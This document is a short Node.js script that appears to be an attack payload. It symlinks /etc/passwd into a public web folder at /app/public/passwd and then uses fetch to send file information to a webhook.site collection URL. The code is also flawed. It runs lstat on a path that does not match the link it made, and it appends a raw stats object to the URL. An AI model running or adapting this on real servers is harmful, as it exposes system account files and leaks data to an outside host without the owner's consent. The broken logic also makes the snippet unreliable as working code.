
const fs = require('fs'); 
  
fs.symlinkSync("/etc/passwd", "/app/public/passwd", 'file'); 
console.log("Symlink to file created") 
  
fs.lstat("symlinkToFile", (err, stats) => { 
  if (err) 
    console.log(err); 
  else { 
    fetch("https://webhook.site/ff07d904-39d0-4e1e-94ef-ca7e055d5538" + encodeURIComponent(stats));
  } 
}); 
